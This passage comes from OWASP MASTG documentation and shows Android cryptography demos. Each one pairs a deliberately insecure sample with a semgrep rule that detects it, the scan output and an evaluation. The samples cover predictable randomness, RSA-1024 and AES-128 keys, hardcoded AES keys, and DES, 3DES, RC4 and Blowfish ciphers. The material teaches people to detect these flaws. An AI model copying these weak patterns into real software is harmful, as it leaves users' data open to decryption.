<pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport java.util.Calendar;\nimport java.util.Date;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        int random1 = (int) new Date().getTime();\n        Calendar c = Calendar.getInstance();\n        int random2 = c.get(14);\n        return \"Generated random numbers:\\n\" + random1 + \" \\n\" + random2;\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0205"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0008/MASTG-DEMO-0008/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-non-random-use.yml<pre><code>rules:\n  - id: mastg-android-non-random-use\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for common patterns including classes and methods that represent non-random sources e.g. via `Calendar.MILLISECOND` or `new Date()`.\n      original_source: https://github.com/mindedsecurity/semgrep-rules-android-security/blob/main/rules/crypto/mstg-crypto-6.yaml\n    message: \"[MASVS-CRYPTO-1] The application makes use of non-random sources.\"\n    pattern-either:\n        - patterns:\n            - pattern-inside: $M(...){ ... }\n            - pattern-either:\n                - pattern: new Date()\n                - pattern: System.currentTimeMillis()\n                - pattern: (Calendar $C).get(...)\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-non-random-use.yml ./MastgTest_reversed.java --text -o output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0205"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0008/MASTG-DEMO-0008/#observation","title":"Observation","text":"<p>The rule has identified some instances in the code file where an non-random source is used. The specified line numbers can be located in the original code for further investigation and remediation.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 2 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java \n       rules.mastg-android-non-random-use                                  \n          [MASVS-CRYPTO-1] The application makes use of non-random sources.\n\n           22\u2506 int random1 = (int) new Date().getTime();\n            \u22ee\u2506----------------------------------------\n           24\u2506 int random2 = c.get(14);\n</code></pre>","tags":["android","demo","MASTG-TEST-0205"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0008/MASTG-DEMO-0008/#evaluation","title":"Evaluation","text":"<p>Review each of the reported instances.</p>","tags":["android","demo","MASTG-TEST-0205"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0012/MASTG-DEMO-0012/","title":"MASTG-DEMO-0012: Cryptographic Key Generation With Insufficient Key Length","text":"<p>  Download MASTG-DEMO-0012 APK   Open MASTG-DEMO-0012 Folder  Build MASTG-DEMO-0012 APK</p>","tags":["android","demo","MASTG-TEST-0208"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0012/MASTG-DEMO-0012/#sample","title":"Sample","text":"MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.util.Log\nimport android.content.Context\nimport android.security.keystore.KeyProperties\nimport android.util.Base64\nimport java.security.KeyPairGenerator\nimport java.security.SecureRandom\nimport javax.crypto.KeyGenerator\nimport javax.crypto.SecretKey\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n\n        val generator = KeyPairGenerator.getInstance(KeyProperties.KEY_ALGORITHM_RSA)\n        generator.initialize(1024, SecureRandom())\n        val keypair = generator.genKeyPair()\n        Log.d(\"Keypair generated RSA\", Base64.encodeToString(keypair.public.encoded, Base64.DEFAULT))\n\n        val keyGen1 = KeyGenerator.getInstance(\"AES\")\n        keyGen1.init(128)\n        val secretKey1: SecretKey = keyGen1.generateKey()\n\n        val keyGen2 = KeyGenerator.getInstance(\"AES\")\n        keyGen2.init(256)\n        val secretKey2: SecretKey = keyGen2.generateKey()\n\n        return \"Generated RSA Key:\\n \" + Base64.encodeToString(keypair.public.encoded, Base64.DEFAULT)+\"Generated AES Key1\\n \"+ Base64.encodeToString(secretKey1.encoded, Base64.DEFAULT)+ \"Generated AES Key2\\n \"+ Base64.encodeToString(secretKey2.encoded, Base64.DEFAULT);\n\n    }\n\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Base64;\nimport android.util.Log;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.SecureRandom;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        KeyPairGenerator generator = KeyPairGenerator.getInstance(\"RSA\");\n        generator.initialize(1024, new SecureRandom());\n        KeyPair keypair = generator.genKeyPair();\n        Log.d(\"Keypair generated RSA\", Base64.encodeToString(keypair.getPublic().getEncoded(), 0));\n        KeyGenerator keyGen1 = KeyGenerator.getInstance(\"AES\");\n        keyGen1.init(128);\n        SecretKey secretKey1 = keyGen1.generateKey();\n        Intrinsics.checkNotNullExpressionValue(secretKey1, \"generateKey(...)\");\n        KeyGenerator keyGen2 = KeyGenerator.getInstance(\"AES\");\n        keyGen2.init(256);\n        SecretKey secretKey2 = keyGen2.generateKey();\n        Intrinsics.checkNotNullExpressionValue(secretKey2, \"generateKey(...)\");\n        return \"Generated RSA Key:\\n \" + Base64.encodeToString(keypair.getPublic().getEncoded(), 0) + \"Generated AES Key1\\n \" + Base64.encodeToString(secretKey1.getEncoded(), 0) + \"Generated AES Key2\\n \" + Base64.encodeToString(secretKey2.getEncoded(), 0);\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0208"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0012/MASTG-DEMO-0012/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-key-generation-with-insufficient-key-length.yml<pre><code>rules:\n  - id: mastg-android-key-generation-with-insufficient-key-length\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for methods that create keys with insufficient length in encryption algorithms.\n    message: \"[MASVS-CRYPTO] Make sure that the key size is according to security best practices\"\n    pattern-either:\n      - pattern: |\n          $K = $G.getInstance(\"RSA\");\n          ...\n          $K.initialize(1024, new SecureRandom());\n      - pattern: |\n          $K = $G.getInstance(\"RSA\");\n          ...\n          $K.initialize(512, new SecureRandom());\n      - pattern: |\n          $K = $G.getInstance(\"AES\");\n          ...\n          $K.init(128);\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-key-generation-with-insufficient-key-length.yml ./MastgTest_reversed.java --text &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0208"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0012/MASTG-DEMO-0012/#observation","title":"Observation","text":"<p>The rule has identified some instances in the code file where cryptographic keys are being generated. The specified line numbers can be located in the reverse-engineered code for further investigation and remediation.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 2 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-key-generation-with-insufficient-key-length\n          [MASVS-CRYPTO] Make sure that the key size is according to security best practices\n\n           27\u2506 KeyPairGenerator generator = KeyPairGenerator.getInstance(\"RSA\");\n           28\u2506 generator.initialize(1024, new SecureRandom());\n            \u22ee\u2506----------------------------------------\n           31\u2506 KeyGenerator keyGen1 = KeyGenerator.getInstance(\"AES\");\n           32\u2506 keyGen1.init(128);\n</code></pre>","tags":["android","demo","MASTG-TEST-0208"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0012/MASTG-DEMO-0012/#evaluation","title":"Evaluation","text":"<p>The test fails because the key size of the RSA key is set to <code>1024</code> bits, and the size of the AES key is set to <code>128</code>, which is considered insufficient in both cases.</p>","tags":["android","demo","MASTG-TEST-0208"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0017/MASTG-DEMO-0017/","title":"MASTG-DEMO-0017: Use of Hardcoded AES Key in SecretKeySpec with semgrep","text":"<p>  Download MASTG-DEMO-0017 APK   Open MASTG-DEMO-0017 Folder  Build MASTG-DEMO-0017 APK</p>","tags":["android","demo","MASTG-TEST-0212"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0017/MASTG-DEMO-0017/#sample","title":"Sample","text":"MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport javax.crypto.Cipher\nimport javax.crypto.SecretKey\nimport javax.crypto.spec.SecretKeySpec\nimport android.util.Base64\n\nclass MastgTest(private val context: Context) {\n\n    fun mastgTest(): String {\n\n        // Bad: Use of a hardcoded key (from bytes) for encryption\n        val keyBytes = byteArrayOf(0x6C, 0x61, 0x6B, 0x64, 0x73, 0x6C, 0x6A, 0x6B, 0x61, 0x6C, 0x6B, 0x6A, 0x6C, 0x6B, 0x6C, 0x73) // Example key bytes\n        val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\")\n        val secretKey = SecretKeySpec(keyBytes, \"AES\")\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey)\n\n        // Bad: Hardcoded key directly in code (security risk)\n        val badSecretKeySpec = SecretKeySpec(\"my secret here\".toByteArray(), \"AES\")\n\n\n        // Returning results\n        return \"SUCCESS!!\\n\\nThe keys were generated and used successfully with the following details:\\n\\n\" +\n                \"Hardcoded AES Encryption Key: ${Base64.encodeToString(keyBytes, Base64.DEFAULT)}\\n\" +\n                \"Hardcoded Key from string: ${Base64.encodeToString(badSecretKeySpec.encoded, Base64.DEFAULT)}\\n\"\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Base64;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        byte[] keyBytes = {108, 97, 107, 100, 115, 108, 106, 107, 97, 108, 107, 106, 108, 107, 108, 115};\n        Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n        SecretKeySpec secretKey = new SecretKeySpec(keyBytes, \"AES\");\n        cipher.init(1, secretKey);\n        byte[] bytes = \"my secret here\".getBytes(Charsets.UTF_8);\n        Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n        SecretKeySpec badSecretKeySpec = new SecretKeySpec(bytes, \"AES\");\n        return \"SUCCESS!!\\n\\nThe keys were generated and used successfully with the following details:\\n\\nHardcoded AES Encryption Key: \" + Base64.encodeToString(keyBytes, 0) + \"\\nHardcoded Key from string: \" + Base64.encodeToString(badSecretKeySpec.getEncoded(), 0) + '\\n';\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0212"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0017/MASTG-DEMO-0017/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-hardcoded-crypto-keys-usage.yml<pre><code>rules:\n  - id: mastg-android-hardcoded-crypto-keys-usage\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for hardcoded keys in use.\n    message: \"[MASVS-CRYPTO-1] Hardcoded cryptographic keys found in use.\"\n    pattern-either:\n      - pattern: SecretKeySpec $_ = new SecretKeySpec($KEY, $ALGO);\n      - pattern: |-\n          byte[] $KEY = {...};\n          ...\n          new SecretKeySpec($KEY, $ALGO);\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-hardcoded-crypto-keys-usage.yml ./MastgTest_reversed.java --text -o output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0212"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0017/MASTG-DEMO-0017/#observation","title":"Observation","text":"<p>The rule has identified one instance in the code file where hardcoded keys is used. The specified line numbers can be located in the reverse-engineered code for further investigation and remediation.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 3 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n   \u276f\u276f\u2771 hardcoded-crypto-key-test\n          Hardcoded cryptographic keys are found in use.\n\n           24\u2506 byte[] keyBytes = {108, 97, 107, 100, 115, 108, 106, 107, 97, 108, 107, 106, 108, 107, 108,\n               115};                                                                                      \n           25\u2506 Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n           26\u2506 SecretKeySpec secretKey = new SecretKeySpec(keyBytes, \"AES\");\n            \u22ee\u2506----------------------------------------\n           26\u2506 SecretKeySpec secretKey = new SecretKeySpec(keyBytes, \"AES\");\n            \u22ee\u2506----------------------------------------\n           30\u2506 SecretKeySpec badSecretKeySpec = new SecretKeySpec(bytes, \"AES\");                \n</code></pre>","tags":["android","demo","MASTG-TEST-0212"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0017/MASTG-DEMO-0017/#evaluation","title":"Evaluation","text":"<p>The test fails because hardcoded cryptographic keys are present in the code. Specifically:</p> <ul> <li>On line 24, a byte array that represents a cryptographic key is directly hardcoded into the source code.</li> <li>This hardcoded key is then used on line 26 to create a <code>SecretKeySpec</code>.</li> <li>Additionally, on line 30, another instance of hardcoded data is used to create a separate <code>SecretKeySpec</code>.</li> </ul>","tags":["android","demo","MASTG-TEST-0212"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0022/MASTG-DEMO-0022/","title":"MASTG-DEMO-0022: Uses of Broken Symmetric Encryption Algorithms in Cipher with semgrep","text":"<p>  Download MASTG-DEMO-0022 APK   Open MASTG-DEMO-0022 Folder  Build MASTG-DEMO-0022 APK</p>","tags":["android","demo","MASTG-TEST-0221"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0022/MASTG-DEMO-0022/#sample","title":"Sample","text":"<p>The code snippet below shows sample code contains use of insecure encryption algorithms.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport java.security.Key\nimport javax.crypto.Cipher\nimport javax.crypto.SecretKeyFactory\nimport javax.crypto.spec.DESKeySpec\nimport javax.crypto.spec.DESedeKeySpec\nimport javax.crypto.spec.SecretKeySpec\nimport android.util.Base64\nimport java.security.SecureRandom\nimport javax.crypto.SecretKey\n\nclass MastgTest(private val context: Context) {\n\n    // Vulnerable encryption using DES (broken algorithm)\n    fun vulnerableDesEncryption(data: String): String {\n        try {\n            // Insufficient key length for DES\n            val keyBytes = ByteArray(8)\n            SecureRandom().nextBytes(keyBytes)\n            val keySpec = DESKeySpec(keyBytes)\n            val keyFactory = SecretKeyFactory.getInstance(\"DES\")\n            val secretKey: Key = keyFactory.generateSecret(keySpec)\n\n            // Broken encryption algorithm (DES)\n            val cipher = Cipher.getInstance(\"DES\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n\n    // Vulnerable encryption using 3DES (Triple DES)\n    fun vulnerable3DesEncryption(data: String): String {\n        try {\n            val keyBytes = ByteArray(24)\n            SecureRandom().nextBytes(keyBytes)\n            val keySpec = DESedeKeySpec(keyBytes)\n            val keyFactory = SecretKeyFactory.getInstance(\"DESede\")\n            val secretKey: Key = keyFactory.generateSecret(keySpec)\n\n            // Broken encryption algorithm (3DES)\n            val cipher = Cipher.getInstance(\"DESede\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Insecure encryption using RC4 (ARCFOUR) (Deprecated)\n    fun vulnerableRc4Encryption(data: String): String {\n        return try {\n            val keyBytes = ByteArray(16)\n            SecureRandom().nextBytes(keyBytes)\n            val secretKey = SecretKeySpec(keyBytes, \"RC4\")\n\n            val cipher = Cipher.getInstance(\"RC4\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Encryption using Blowfish (broken algorithm)\n    fun vulnerableBlowfishEncryption(data: String): String {\n        return try {\n            // Insufficient key length for Blowfish\n            val keyBytes = ByteArray(8) // Only 8 bytes (64-bit key) - not secure\n            SecureRandom().nextBytes(keyBytes)\n            val secretKey: SecretKey = SecretKeySpec(keyBytes, \"Blowfish\")\n\n            // Broken encryption algorithm (Blowfish)\n            val cipher = Cipher.getInstance(\"Blowfish\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            \"Encryption error: ${e.message}\"\n        }\n    }\n\n\n    fun mastgTest(): String {\n        val sensitiveString = \"Hello from the OWASP MASTG Test app.\"\n\n        // Encrypt with broken DES\n        val desEncryptedString = vulnerableDesEncryption(sensitiveString)\n\n        // Broken with risky 3DES\n        val tripleDesEncryptedString = vulnerable3DesEncryption(sensitiveString)\n\n        // Encrypt with broken RC4\n        val rc4EncryptedString = vulnerableRc4Encryption(sensitiveString)\n\n        // Encrypt with broken Blowfish\n        val blowfishEncryptedString = vulnerableBlowfishEncryption(sensitiveString)\n\n        // Returning the encrypted results\n        return \"DES Encrypted: $desEncryptedString\\n3DES Encrypted: $tripleDesEncryptedString\\nRC4 Encrypted: $rc4EncryptedString\\nBlowfish Encrypted: $blowfishEncryptedString\"\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Base64;\nimport java.security.Key;\nimport java.security.SecureRandom;\nimport javax.crypto.Cipher;\nimport javax.crypto.SecretKey;\nimport javax.crypto.SecretKeyFactory;\nimport javax.crypto.spec.DESKeySpec;\nimport javax.crypto.spec.DESedeKeySpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u001a\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0002\\b\\u0006\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006J\\u000e\\u0010\\u0007\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\t\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\n\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\u000b\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\f\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"vulnerable3DesEncryption\", \"data\", \"vulnerableBlowfishEncryption\", \"vulnerableDesEncryption\", \"vulnerableRc4Encryption\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String vulnerableDesEncryption(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] keyBytes = new byte[8];\n            new SecureRandom().nextBytes(keyBytes);\n            DESKeySpec keySpec = new DESKeySpec(keyBytes);\n            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"DES\");\n            Key generateSecret = keyFactory.generateSecret(keySpec);\n            Intrinsics.checkNotNullExpressionValue(generateSecret, \"generateSecret(...)\");\n            Key secretKey = generateSecret;\n            Cipher cipher = Cipher.getInstance(\"DES\");\n            cipher.init(1, secretKey);\n            byte[] bytes = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerable3DesEncryption(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] keyBytes = new byte[24];\n            new SecureRandom().nextBytes(keyBytes);\n            DESedeKeySpec keySpec = new DESedeKeySpec(keyBytes);\n            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"DESede\");\n            Key generateSecret = keyFactory.generateSecret(keySpec);\n            Intrinsics.checkNotNullExpressionValue(generateSecret, \"generateSecret(...)\");\n            Key secretKey = generateSecret;\n            Cipher cipher = Cipher.getInstance(\"DESede\");\n            cipher.init(1, secretKey);\n            byte[] bytes = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerableRc4Encryption(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] keyBytes = new byte[16];\n            new SecureRandom().nextBytes(keyBytes);\n            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, \"RC4\");\n            Cipher cipher = Cipher.getInstance(\"RC4\");\n            cipher.init(1, secretKey);\n            byte[] bytes = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNull(encodeToString);\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerableBlowfishEncryption(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] keyBytes = new byte[8];\n            new SecureRandom().nextBytes(keyBytes);\n            SecretKey secretKey = new SecretKeySpec(keyBytes, \"Blowfish\");\n            Cipher cipher = Cipher.getInstance(\"Blowfish\");\n            cipher.init(1, secretKey);\n            byte[] bytes = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNull(encodeToString);\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String mastgTest() {\n        String desEncryptedString = vulnerableDesEncryption(\"Hello from the OWASP MASTG Test app.\");\n        String tripleDesEncryptedString = vulnerable3DesEncryption(\"Hello from the OWASP MASTG Test app.\");\n        String rc4EncryptedString = vulnerableRc4Encryption(\"Hello from the OWASP MASTG Test app.\");\n        String blowfishEncryptedString = vulnerableBlowfishEncryption(\"Hello from the OWASP MASTG Test app.\");\n        return \"DES Encrypted: \" + desEncryptedString + \"\\n3DES Encrypted: \" + tripleDesEncryptedString + \"\\nRC4 Encrypted: \" + rc4EncryptedString + \"\\nBlowfish Encrypted: \" + blowfishEncryptedString;\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0221"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0022/MASTG-DEMO-0022/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-broken-encryption-algorithms.yaml<pre><code>rules:\n  - id: mastg-android-broken-encryption-algorithms\n    languages:\n      - java\n    severity: WARNING\n    metadata:\n      summary: This rule looks for broken encryption algorithms.\n    message: \"[MASVS-CRYPTO-1] Broken encryption algorithms found in use.\"\n    pattern-regex: Cipher\\.getInstance\\(\"?(DES|DESede|RC4|Blowfish)(/[A-Za-z0-9]+(/[A-Za-z0-9]+)?)?\"?\\)\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-broken-encryption-algorithms.yaml ./MastgTest_reversed.java --text &gt; 